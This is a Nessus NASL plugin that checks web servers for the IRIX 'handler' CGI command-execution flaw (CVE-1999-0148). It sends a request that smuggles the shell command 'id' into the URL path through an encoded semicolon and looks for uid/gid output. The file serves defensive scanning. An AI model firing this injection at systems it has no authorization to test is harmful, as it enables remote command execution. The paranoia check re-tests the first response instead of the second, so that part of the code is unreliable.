#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(10100);
 script_version("$Revision: 1.34 $");
 script_cvs_date("$Date: 2015/09/24 21:08:39 $");

 script_cve_id("CVE-1999-0148");
 script_bugtraq_id(380);
 script_osvdb_id(85);

 script_name(english:"IRIX handler CGI Arbitrary Command Execution");
 script_summary(english:"Checks for the presence of /cgi-bin/handler");

 script_set_attribute(attribute:"synopsis", value:"The remote host is affected by a remote code execution vulnerability.");
 script_set_attribute(attribute:"description", value:
"The 'handler' cgi is installed.  This CGI has a well known security
flaw that lets anyone execute arbitrary commands with the privileges of
the http daemon (root or nobody).");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1997/Jun/67");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/1997/Jun/114");
 script_set_attribute(attribute:"see_also", value:"ftp://patches.sgi.com/support/free/security/advisories/19970501-02-PX");
 script_set_attribute(attribute:"solution", value:"Remove the script from /cgi-bin or change the permissions.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value:"1997/05/01");
 script_set_attribute(attribute:"plugin_publication_date", value:"1999/06/22");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

 script_category(ACT_GATHER_INFO);

 script_copyright(english:"This script is Copyright (C) 1999-2015 Tenable Network Security, Inc.");
 script_family(english:"CGI abuses");

 script_dependencie("http_version.nasl", "find_service1.nasl", "no404.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");

port = get_http_port(default:80);

cmd = 'id';
cmd_pat = "uid=[0-9]+.*gid=[0-9]+.*";

url = "/handler/blah%3B" + cmd + "|?data=Download";

res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);
if (egrep(pattern:cmd_pat, string:res[2]))
{
  # Unless we're paranoid, make sure the pattern
  # doesn't show up in an error message.
  if (report_paranoia < 2)
  {
    url2 = rand_str(charset:"abcdefghijklmnopqrstuvwxyz0123456789_") + "/" + unixtime() + "_" + SCRIPT_NAME;
    res2 = http_send_recv3(method:"GET", item:url2, port:port, exit_on_fail:TRUE);

    if (egrep(pattern:cmd_pat, string:res[2])) exit(0, "The web server listening on port "+port+" appears to return '"+cmd+"' command output in response to requests for invalid pages.");
  }

  if (report_verbosity > 0)
  {
    header =
      "Nessus was able to execute the command '" + cmd + "' on the remote" + '\n' +
      "host using the following URL";
    trailer = '';

    if (report_verbosity > 1)
    {
      trailer =
        'This produced the following output :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        res[2] + '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }

    report = get_vuln_report(items:url, port:port, header:header, trailer:trailer);

    security_hole(port:port, extra:report);
  }
  else security_hole(port);
}
